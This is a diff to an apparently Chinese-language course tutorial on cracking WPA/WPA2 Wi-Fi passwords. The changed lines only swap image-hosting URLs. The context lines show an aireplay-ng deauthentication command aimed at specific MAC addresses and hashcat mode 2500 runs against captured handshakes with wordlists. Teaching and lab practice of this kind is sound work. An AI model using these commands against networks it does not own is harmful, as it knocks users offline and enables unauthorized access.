@@ -60,7 +60,7 @@ aireplay-ng -0 5 -a D8:24:BD:79:18:0B -c 18:CC:18:C5:D5:64 wlan0mon
 
 获得握手包，用于破解
 
-![image-20211201201536769](https://img.gyxnb.top/img/image-20211201201536769.png)
+![image-20211201201536769](https://image.201068.xyz/assets/image-20211201201536769.png)
 
 ### 7.生成hccap文件
 
@@ -78,7 +78,7 @@ hashcat -m 2500 wpahaccap.hccapx /root/wifi/passwd.txt
 2500:wpa/wpa2
 ```
 
-![image-20211201201625121](https://img.gyxnb.top/img/image-20211201201625121.png)
+![image-20211201201625121](https://image.201068.xyz/assets/image-20211201201625121.png)
 
 ### 9.再次查看密码
 
@@ -100,9 +100,9 @@ rm ~/.hashcat/hashcat.potfile
 hashcat -m 2500 wpahaccap.hccapx /root/wifi/pwd.txt
 ```
 
-![image-20211201201735564](https://img.gyxnb.top/img/image-20211201201735564.png)
+![image-20211201201735564](https://image.201068.xyz/assets/image-20211201201735564.png)
 
-![image-20211201201746153](https://img.gyxnb.top/img/image-20211201201746153.png)
+![image-20211201201746153](https://image.201068.xyz/assets/image-20211201201746153.png)
 
 ## 3.课后小结
 
